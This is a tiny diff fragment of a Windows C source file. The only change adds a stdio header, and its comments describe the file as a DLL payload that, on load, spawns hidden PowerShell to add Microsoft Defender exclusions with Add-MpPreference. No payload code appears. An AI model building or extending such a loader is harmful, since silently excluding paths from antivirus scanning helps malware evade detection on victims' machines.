@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <stdio.h>
 
 // DLL payload - adds Defender exclusions via Add-MpPreference
 // Runs on DllMain attach, spawns hidden PowerShell
